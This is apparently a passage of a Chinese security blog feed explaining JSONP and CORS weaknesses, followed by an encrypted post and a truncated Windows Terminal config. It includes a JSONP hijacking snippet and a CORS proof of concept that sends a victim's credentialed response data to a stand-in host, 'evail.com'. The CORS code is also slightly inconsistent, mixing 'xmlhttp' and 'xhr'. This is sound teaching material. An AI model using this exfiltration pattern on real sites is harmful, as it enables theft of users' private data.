class="string">"text/javascript"</span> &gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>b.com后台示例代码如下 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(value=<span class="string">"/getinfo"</span>,method=RequestMethod.GET)</span><br><span class="line">@ResponseBody</span><br><span class="line"><span class="keyword">public</span> String getToken(@RequestParam(<span class="string">"callback"</span>) String callbackFunction)&#123;  </span><br><span class="line"><span class="keyword">return</span> callbackFunction+<span class="string">"&#123;\"result\":&#123;\"data\":&#123;\"token\":\"18623163885dedec5decbab1.37745340\"&#125;&#125;&#125;;"</span>;</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>则此时 而此时b.com 响应报文返回的json数据为：jsonp_callback({“result”:{“data”:{“token”:”18623163885dedec5decbab1.37745340”}}});然后a.com能够获取返回的数据</p><hr><h2 id="jsonp开发实践中经常会出现的一些问题"><a href="#jsonp开发实践中经常会出现的一些问题" class="headerlink" title="jsonp开发实践中经常会出现的一些问题"></a>jsonp开发实践中经常会出现的一些问题</h2><ol><li><p>未正确设置响应报文头Content-Type 而导致的反射型XSS一般来说，默认的响应报文头<code>Content-Type:text/html</code>，则此时容易产生反射型xss，从而进一步获取数据。因此我们可通过设置Content-Type为<code>application/json</code>指明返回的报文体是json格式的，避免浏览器解析执行。这个主要是后端是根据前面传入的callback参数的，因此可能导致反射型xss 。</p></li><li><p>JSONP劫持：有些web应用，尤其是同域名下的不同子域之间，通过JSONP方式传输敏感信息，例如用户信息、支付信息、鉴权token等，就要关注JSONP劫持问题了。</p></li></ol><p>一个简单的劫持的代码片段，对于这种jsonp劫持问题，一般企业是对返回的数据做了脱敏处理。尤其对于 姓名 身份证号 手机号 银行卡号之类的个人敏感信息一般只保留其中的几个字符，其他用*号代替。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; <span class="function"><span class="keyword">function</span> <span class="title">jsonp_callback</span>(<span class="params">msg</span>)</span>&#123;      </span><br><span class="line">   <span class="comment">//alert(msg);        </span></span><br><span class="line">   do_evilSomething();<span class="comment">//发送敏感数据  &#125;</span></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;script src =http:/</span><span class="regexp">/b.com/g</span>etinfo?callback=jsonp_callback type=<span class="string">"text/javascript"</span> &gt; <span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>不得不提到，JSONP跨域数据传输只能通过GET方式，下面再介绍另外一种跨域方法—CORS。</p><hr><h2 id="cors"><a href="#cors" class="headerlink" title="cors"></a>cors</h2><p>&emsp;&emsp; 我们常说的跨域资源共享(CORS) 是一种机制，它使用额外的 HTTP 头来告诉浏览器让运行在一个 origin (domain) 上的Web应用被准许访问来自不同源服务器上的指定的资源。当一个资源从与该资源本身所在的服务器不同的域、协议或端口请求一个资源时，资源会发起一个跨域 HTTP 请求。但是浏览器决定是否阻断此次请求是要看被跨域请求的网站（b.com）的返回头header中是否包含“授权访问标头”—Access-Control-Allow-Origin。</p><p>一个cors请求代码示例：</p><p><img src="https://img-blog.csdnimg.cn/20200515155329679.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200515155343926.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 响应中响应首部字段 Access-Control-Allow-Origin: * 表明，该资源可以被任意外域访问。如果服务端仅允许来自 <a href="http://foo.example" target="_blank" rel="noopener">http://foo.example</a> 的访问，该首部字段的内容如下：Access-Control-Allow-Origin: <a href="http://foo.example" target="_blank" rel="noopener">http://foo.example</a> 。</p><p>&emsp;&emsp; 当然这次请求会成功，但是当我们把上面的代码片段中:<br>xmlhttp.setRequestHeader(“Content-Type”,”application/json”);<br>我们会发现浏览器会多一步操作就是先发送一个 OPTIONS方法请求，通常也称为预请求。火狐等浏览器规定是以下情况的请求需要先进行“预检”。<br>&emsp;&emsp; 当请求满足下述任一条件时，即应首先发送预检请求：<br>Content-Type 的值不属于下列之一:</p><blockquote><p>application/x-www-form-urlencoded<br>multipart/form-data<br>text/plain</p></blockquote><p>&emsp;&emsp; 使用了下面任一 HTTP 方法：<code>PUT DELETE CONNECT OPTIONS TRACE PATCH</code>，还有人为设置了对 CORS 安全的首部字段集合之外的其他首部字段等。如果需要跨域请求带上被请求域的Cookie，则需要响应中响应首部字段：<code>Access-Control-Allow-Credentials: true</code> ，但同时浏览器为了安全起见，同时和<code>Access-Control-Allow-Origin: *</code>使用请求会被直接阻断。</p><h2 id="CORS中开发误配置所导致的安全问题："><a href="#CORS中开发误配置所导致的安全问题：" class="headerlink" title="CORS中开发误配置所导致的安全问题："></a>CORS中开发误配置所导致的安全问题：</h2><p>（1）Access-Control-Allow-Origin 误配置获取敏感数据<br>一般有些应用确实不允许跨域，但若web中间件（例如nginx）上被误配置（尤其和其它应用使用同一个nginx做反向代理【add_header ‘Access-Control-Allow-Origin’ $origin;】）就会造成本级应用被强制允许跨域。<br>(2）本级应用允许跨域，但编写正则可绕过<br>(3)    绕过预检请求的写操作CSRF<br>&emsp;&emsp; 假如应用A与应用B的某个接口之间(数据传输使用json格式)存在跨域资源共享，但应用B未校验Content-Type，因此可通过XMLHttpRequest设置<code>Content-Type为&quot;text/plain&quot;</code>绕过预检请求<br>&emsp;&emsp; 携带cookie发送请求报文到B的服务端。（若浏览器发现B返回的报文头没有<code>Access-Control-Allow-Origin</code>和<code>Access-Control-Allow-Credentials: true</code>字段，则不允许读取返回的数据）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jsonreq</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xmlhttp.withCredentials = <span class="literal">true</span>;</span><br><span class="line">xmlhttp.open(<span class="string">"GET"</span>,<span class="string">"https://www.b.com/getuserinfo"</span>, <span class="literal">true</span>);</span><br><span class="line">xmlhttp.setRequestHeader(<span class="string">"Content-Type"</span>,<span class="string">"text/plain"</span>);<span class="comment">//注意这里</span></span><br><span class="line">xmlhttp.send(<span class="literal">null</span>);</span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line"><span class="keyword">var</span> res= xhr.responseText; <span class="comment">// 读取返回的数据 </span></span><br><span class="line">location=<span class="string">'http://evail.com?param='</span>+res; </span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">jsonreq();</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>html&gt;</span><br></pre></td></tr></table></figure><hr>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;﻿# 第一期&lt;/p&gt;
&lt;h2 id=&quot;逻辑漏洞挖掘&quot;&gt;&lt;a href=&quot;#逻辑漏洞挖掘&quot; class=&quot;headerlink&quot; title=&quot;逻辑漏洞挖掘&quot;&gt;&lt;/a&gt;逻辑漏洞挖掘&lt;/h2&gt;&lt;p&gt;&amp;emsp;&amp;emsp; 逻辑漏洞中的认证缺失和认证缺陷漏洞，主要指功能级访问控
      
    
    </summary>
    
    
      <category term="笔记" scheme="https://summersec.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>记一次面试题</title>
    <link href="https://summersec.github.io/2020/07/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
    <id>https://summersec.github.io/2020/07/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E9%A2%98/</id>
    <published>2020-07-15T11:01:42.000Z</published>
    <updated>2020-11-01T15:34:30.071Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="bbade943b565fb416235f91f8fe345a8046f20e7a1d95c59660dd70631f19ca2">ed9922697a085d1821237be7dd773a3c60e2869651829dd0f3831e347be01f9e22a6d1e618a654b28666abfbb50c8115803fd41338ea2726c27e87d6d45e78147d43c66b013339106d9dbce2fb5d1be3dfd3aecce6abc3c773484f38a6f96e197fd812aba9771fc48931b4b443e52102b1e4750d9e4cc4cc08cca994414ad053dae388f3e115b5f69b8883cfdf334053a50920a6cd3487fb2ffce0112719335ee7ed33f716c08ba7ae971beac318bb19f62a2f2dd2c7c49954efbd566128e34166cb7b2881bff3c915f031c5b7bc121f9cfb11cbf500f00a4b9cb1204e22760b8dd368a9280e9cead7da72e26b16863b2552fb1664810bf22a76c9a0c931911ceeef4142471a136313fba67467d595e22718a8d32164dbb8eab2591f7c53f5503e0825fd50ee70670e343b17039b3c618d2bd16903849c9416da359209c695376ca80240a28b17142b4cc08bd2a1094d1d6e835d8302f3b5649fb1f614360e7df6fb3ab7f00d78bbfe458399cb59560aa2fc2df916efd1b57e917ec588c02826d8df0f64dbeb0d363189c72f0abda3869ae6de882d232a1b3e0f6e7a1c5c67f62c03689b9d4d634d4e51a912c2b425f568c904423a4eabb1fb583c312f4b6d8ccfaa001c01c07cf943f867fac106ed46200565351cb35b20dd10aed7ce6f733df7d2042778fdcad23bdd6627fe9256af213ed7245f100895e765decfb292c464e06497a340f79407ad8deeb77fea113d0684501cb658e6a136e7cb2f19518db1c4c07511c9c9f45ede6422a0275a5e0b3b0c3f9e88f0f33aa3f78ed8dcbc3f9d36863933772efcb261c924a4cd2ede6d22327b019cda540b470cb4e620b04b35503b23786bc2584fa3780f833e2c31dfe17a5dd76d39ce09ca710e6c7175319367315557eac603c90ac6c2c2bea67d1adaf412740d58f3d4591f58356306c905a5de754638db864f21826693c2d1a9387b20d20433b6c6e893a0985e167228725003cc1cd0aa9c07db4ec0f42b1b10d8fcfc22c85c51f02570234de52d2056fdd9f40094a231bcab93029d93fe841e6748271e5fa84fe3e9716de6e66a07bf06d2e5e3ab8ed58852e56f5fa460caeb16b1f6dbdb566db19c4e0d49e578b5cc8203e57d63baa552fd9fd338d5bc76dc5c4e6656c86c0b65be176d906cccaeeb47f8767c58dcab14df8bb64efcc0f8828d64d1d889cd96d8e223e04b20a5af2a8eacebafc84a6005e3cc1f9d362e73d7a4089eae797b6e612d78fb16e62b4c2e2b1e01c01e706d8693c476b51978165fcca83bb04f12420e210cc6829ef3452d9b0976ba5e3f58c5b4435410eff2fe12026168f7a11136af99631fb6ce76a29dc6d50a19fc286018b7f76fb1e6e109e7bc0e2b5deb9393e8b6f5b8389681b19ebf0ee7a927a244a18183ff4528b45af54564c62446b4497abb2bf22036272c2dbe743ccc9d141c38a5a7b094204a4e7fd0de1ca027ac4d81a7935d4aa204142dab6e6bf5d86a9438a63091479da5291deca0d4d7ec39f6753a2eb0af47ce4ee238d7f0ef966d0e2ff5b1a41634369b356da14fe615b364f8e8c844b31b012a236bf4c7b24480305e16ca6f220c9088100d3e9468c10fe5500a84f394ef781600c8bcd1aad6e82ab82f1e291bb47d270636894fafc0e14c276004c02ae5955bfcfa89999c8a81cc366801a6f6dd920c8e8b3fd0a9e2310667983755609ed28db611a4ed92ea2785ddf7b52be21537e17c01c3b4cf78c38e5311e9b018b9fd516b060d6150390bd9d17c4fec48954db84a99133622872e10574feb6edfc1a2435456699cdc19dfa1045c14d4381a25f804f3753dca30662d35ff3c2fc6dccfd118c85ffdc7cbac130336da2f6911baf913348c3292611ef74e0b5c0596c07e638da463629ce4318325e283b2f2d3448894051fab456d029415261d21fd0efba40cd9ad12719f62dc582707509a2da649f50f11421435894af764d0947ee61da7bb3b6dd42fd0771cb64b782d014396c5d7b7d5db6a87cb01d7a2d30955451d8401a1b9a6614addbabe828d76c2eed7806378bb6255a3cbe380fb867d2c50a15fb33a1705ee7aa9892e3d80f6b22b4bc3799c0d223a9c197b24690f06833f4f76fdd195209982d1e343bb5e1fc2a4cc155fc510616ba54144afd7fbb1ab2a63dcd413fdae497bb4b8d3823bc889a6503685120df5713bc3fea37f954809ff2943f7141b85ef86216c456e61da08f111118bf98f286955401fde88635d55f060bbbdd917d884c655c44e15878f4712e6fc0a133a33f9d56cc0c2e87c4850662c2403b273564aafb93092cb37606bd71927cfeb48e97ae690ef0d81c7f0d0677edbd3cc8c1524df4de1e9fd58cc5ad056b98f8012c3246f18e5c9165da6c184f3c8177fd96783825b6b6eac333ef73a1e7c6e9b304d1910c10e87d932e97cdc5cb1c200e34b6261c425b0b5481c82834c12a9e7d57592dfd5fee96048262118cced1c352973a8cdb1f34850cf574a882371e87328b0d5f5226cbadc05b43be91add3478734d884e98ba873aa1eb8c448a092259edceb96b2b2d4f227eeb260b9644bd91cb5fdeb04aa70bc783781b4256179479ddb7e204d1f4c89cf0c229bc8e9ad75a7e0f4eb8683e8dfeda1e731a3ff1ba00ce1f5c6f4387165fb7dad53559681c038454f869bf82bdad0334fd6e9c1c3847144fe59fc4be87cdfc6eb6e1395c878652e12ddcc36b28125d8e0be02c6fe011ffd393d642d0b797b2f8e6e9fb446136ce871082dcb733c0b6e8348c94e69a38545c40e95c72db46610d83fd8011bd7d34e28b324b9e380a5884de268cd8aef97636e388f24cdb00242e6b222d4a1bf8453caa6deafd48c85c56283109db4b207f79218b0515d01ce1d5945e84b3711cfc553a4e07905c5ee9c21da14bd291179c8b0ac4153e9da93c5753d653f469d1bad1cb7f24c34d0ee4f9fa811ef6db503862e89fe232368ae0ca7bc92f23ad0306d151f126f182d840e031d957d3135a1cbb5a0226af2b30cc307e7d464aa204495761d114c571ec09a326695b138df42f11615fc2fa95b376ebcab707b214978ac39ea3e4766e7aad154ac8f21a8217f47c4a5bed05b6c366e807b5de27375d01ddf44fe20c35fb9061628c1e572858d5819e55ab542c1447006bd1809d3dafd1362d8c870ea5395791df2c2bcd2447471c7e67f3ebbe9e9553dfc2ab0f7e3e1dca7d9f89c1c1e1253a60537e4f62c5bf492e25f84bda93a49fbb881ec390df58b405f42c4492e48c8fcdc14722cdb01f7eafc0bc1974d6dd4b29953a3da4d7f44625cba3cff913d1ac09ffb2dc67792db14a52302546d0d12b3fff8b75bb1c9878475138201786a61f3f029418f69d2b2ec68386e8564f983db484ba163cb937daecd5e1302f4bc7fcd1749dcdfc82b4b4a3d350531124631c73b404ee6a3fbff989c3e5d73d78a49ce5dd7342ff70caa1116aedd9efdadb57ebf58591e34dab7962354e3c00fb84d2b672a4a709ebbe6e426dfa20e57242312c41557abf0e8a415d99cf8fa6b9583302c15fede7eb6357a5402f9091c6a4e991b5878788e6b302503a974d49bfe96d783ffca71d7f0fb51056690c0a33f70bde2bed1fc8682c12e8101d6f31eb9aa971d9e282d0975bccbf20797f8a66199c88a3a4aa892c8ad0c46f8febf541c67915eaf018b055a594478c1356b9b6258faebfc4728beba5fa2e7c7311f7c7daa75c6b8f8dbfa7b42e46323a3cd8c021bd619df0a65647beec3386fda9ca40b73b659bb5b27dab1dd9692c89406cfd773cc06af972d1055dfaa4c67ad880dff22d79569a5e8f7476a4e1cdf4f336b88980a507dbe5baff5f837dbb175dc4690af3106fdc523353129a1e804d62de7248b529c886249b2d45713514bf810728ddbb6ba39f5b262e2f141f09c659c7060ac727b1bfab53731e113de5a4188ab0a8e7d5c673584dc6d2e8c774ed61813ada7883ef2fcc5e157688c15e65661bd7315725f8c231462f724c8cd0d30437c6bc6958e938a20ce99afd72031442422390e07755e881c66167218b4dde2fd75427de956757839f9fa0106b8e2941340152635b607dbbadfe5262fdcce310fae0ca81b5a792d484e7f6f84075aa14e33e8e2e0a9aaf4dd1daf119e4c925b3141675cc02cb18a6b9af6d4f13d453852584d09f9a1e82615651d5d16ec5ce15c392a3578171ee84470c4b76ea21618541450dc6be0d1b8a271f64305ce8969eafea81288da73e6a4fa70847901fc243df8cd1fc39bbc62a9c79ac88536a2a3802aa55c66d4625e62fdb722247784642f2e0c8083a8873e2202029fa8bbc551cb58701108ba5c95a9a89de57c950e138bc95126f36a332c2551ed57f16e5ea5bc1d86b1616ac38f131bd4b74dc9a2633d83cc1e2587a5652bb92578339ac0d686803edb25fd62fbfae7cec6027863809adb6a5acf47ead92ff7e996deb34782c9f8e8ef61f05070727e2b5d106a0519299a0a0c56be8680886e8b2acd58d9dc6aa69c336d48ca04cc5a6c7090bab1a59b3fb4fb750d320c7a35964260a4fe9547a842f413549d1d3ad46750984081030793eb75f08de55e96ece8e22c364cdc9b1e26aca497e0808a4a9b678e1b651129972fc2997ffc52bad7c1d8a4a6ed5c4b8bff387a05acc8cdb64f7c530c00de2ab93b472e6fe834c4f65c14841d4cd04acd5aa6578ea26c3bd35d926757841c38e9928e42fbb7689a9651f6d2ca81d9bf08afb05dad0d82bbeba1b01dae8dc21340f95ddb56205db466640debca96f99578c8640ebc9a55063fa2391aba98827d11141b920826295c94f94b6e09823da7935518f3e241cc9bb549dc5266dd2869a5ed0ecf0a1a38e738e083ea73b0bd48579d156fda9c06288510a58016525fa4c2cc7b83b1a344fb724f5bff86095106dc8fa95c754eb7b334aa47707c46904af24133c3a39979a313dc700a0eac5c0930c75e4aa1a674e16788c23adc902a567113b6924526afd060bf43ed2f69fc12a290854e1b48913d134717d6d660e41264a20ca0c844a2e57942692dd117c72ed6e80cfa98c121e207a4962f403c8fb658bd26689b0a375a4d5a01ecda0233262a5d1dfbc1eeb214c90981fede825654dc275d891d9cff423e20b5ea0a190f805d971e79801972d2d8f249c6922d8c0f2d7c3647e3823c56733e8545b2c47b6ffb181558c365b9fdfe7a2496f78a296e5b9adbad507d656f75a3ea095a66b2de4918e23bfc0d8df3a19e6a8fa8ecd0da0ee0fbf9cc9b2254ea353c2d01fb514b5dae6c507602c1e25c3e09e84b2cc31d4284c24fd05c241dfc268cab7834df227b163f1fcfaaafb8f6f918cfc22272af81ddbcd61e3652c5cdf78c91d525d8bb48990a3cd881eea3e1ecdd56a2200854ab4275589cbcc6e3dd5871fb253aaf3f4bf263b6c1626a1d04b01a610adc9021543441382c2d82800f41df6fc314de21b5e02b4fa84b0b8e01845ccb3f54526a53d3fd9cee713aa96df2de6318250f06412cf92a0f88e970d4841efe4e71a07e833be70d08081611727a3d8181fbd0146fb0961b5c26d10178eb4ce328d7f63b95ed07d88a89f875557bcfcec8a083763e78b1abfdb2679890be7f483f2c5e60fd1e67ba580e9db1a34ebd227446e8966fdfe933d0faf05b7a5e10f9d7e26a023ebfbe3606090c2ceb7439347a81daf8ae44e46691ac6c6a709849d0bec7a1ffcaca44a030327e8e73860c14d312f50fc1391f150cde7c6fd32bdb590e9e59c3c19f98ff94f1af4feec2edb16043444aa023110ad8bc9569c54b6ba9d617b2fe4fa886fee571ffe693103d2036f111bdc495c6d74470fa2990990bdd4ed37eb7d8ee39891ceb788937b0fc440c78476a8ce4fb5d3b6717aef8a17b3ebbc5121380bf8f5fa641c8e5c9f3ff6d400ba08b39f8e8f53a10f3bb3f4983e485d83a3d9e59c6dcc24f70f3d1b28e299338f9b8c8b25321366cf94453482ed101a715914ce933b278de620e5e5893ad739f46f93170c7875510bae5fb9acb6d8819e2f762adafde4a49c3c5c9d5636c5a5d36f50e97ef5fe5362fadbb0e4d9fa095d6275f412b549fc8e8dd12df1b44b84ff2b093181527abf840efeb5617b341004d47325d800c086a740039ebf37ddd7a9ffcaf8427e3f175134d301870b7b85be904be39e8639caf2932e7b9b09b7463986c66070ccd20a1f7fcfe027275a6029bb48ba95f526a5581e4b408bf160e05c276b2c6ccd2d27a391426f7d8beb28f4a23a4736466d88b1d5152b82483829b14ab12a9b91bd415618a6b26a8ef0b449766032dbd57002bb40147b1e386cda04e3fb9950738ea69f1d927d5059d66858a3243f0850123cd9d6feb1cb13e838a67e51742f4aab0c0c9ad1b9876fa4938091b32aaa5ad5489a2e0f28f6d3de96b4a413c945257624f9490c2e6be8f430ffcb92fb58f5399e4706c00139b67a677d46d58db6bb9f93d9a255158cca973e82bfd2afdc4d5ff7359f47e62ad4d31af4e927ea07a55d275c7ad54123caaf079e5023e8ff9d6d7c4651a33012fc5e76518be0745e905abde3dd92e907facd35a9ed3dc88b0f0fe0c85137d5815f4f826087721328695137bb46fac9c643afc4167425749e1a14a8e5116e26afce7a094e78337de75458a279adc5539dd1cff59d3d5549f4318d2a492d76814dcb42b26716a2e5472aaa1fda43645b41cbbc6713549b18677a43f0ded19ee6f2b55d4b26b269f321be141477bf98a0f6e369fdf26ecc26342eadd439e80b1528ea0ce2cc2c3d4e54abb32fad7d572a5a2101f31e0d6d006df27fc272a3bf83128900780c5f4044f35252408aee6144d0bdbdda699b45619cd5f2b8f2a16a20f6294e703bfa436980af24c4d184c33cb0a6bd12d01ada691de2d821bca1b9c1324b8a16c6a9e362c7fa86b2a6fc5498a0c5c824f6b7543a8b50ad8f2a26f02d5257e5b236749cc0392df4917b3afe63a39f34930faae39f6a6e8fe171a420498322cdc9c6bba804e928d8feba7a392cc65220ee7b34f8b828b3fcb2c1ffc457b53191eebe09c979c0cc46903f54a2d8da7f6613bbc4549440b05b62c8300b5245511d65178354e4b45c1c9f3f3a1ddd1e69935a023d7a9e3109f12eacfb99337841d1d120815d9808c2dde0275a2e52964441f76feee591417127bdb820e358cbcfe8d08fc0666c21714e55d853ecf417697a65d6317e53569de8071c6c2fdd6b76d8e75f4a0716dda660c097034200b811096d321e6a219e25a46bf43d3476360ebccaacfd155c4ddfad39420ac0c6427a47c2d44363e00225ba2d4740447785d61e4a59e18cbddd0a613f10a2e17d5d941b7eab0f6cfc34c7f35b34e849e737fac1ccb6f12f785c229a729a6b1fe3eee54298ada395d3718ed9a2ba0377be7aa7d7be4d59ff7528b8d86190f2da22ebd43b2a5535106ecf3fe61fa9629e3feb6eaab89129d4bebfceb86807e29ef29e298f0ad32df1872550c39f9a4fec26f55da9a6ce6b2aeab2c2ed4dc1f28f3c251c4b6acafbf40969c989568b127535537f40e07757834f6ba2563d2399284f02a8831a0d5f9eced56d55947240e380aeb16e02c48ba583fa3de705fbd7ecaa58243029846af52858cbc0e7ef71419652b65e94ee7e94550fb430834fced972fe16fc079718f587b3d869a148a433ce4b6d698dc5ab944a04193c44fa8440b19333447f521a1064ef4425240d1023fd1e219d93990ce871758999d7e6757f0d51aa834a42404ce2fb0824366b1986a5805f6ddda935c69708006afc6b4fce6d</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="笔记" scheme="https://summersec.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>Windows Terminal 配置文件</title>
    <link href="https://summersec.github.io/2020/07/01/Windows%20Terminal%20%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/"/>
    <id>https://summersec.github.io/2020/07/01/Windows%20Terminal%20%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/</id>
    <published>2020-07-01T11:01:42.000Z</published>
    <updated>2020-07-20T11:23:17.882Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// To view the default settings, hold "alt" while clicking on the "Settings" button.</span></span><br><span class="line"><span class="comment">// For documentation on these settings, see: https://aka.ms/terminal-documentation</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"$schema"</span>: <span class="string">"https://aka.ms/terminal-profiles-schema"</span>,</span><br><span class="line"><span class="comment">// 默认打开窗口guid</span></span><br><span class="line"><span class="string">"defaultProfile"</span>: <span 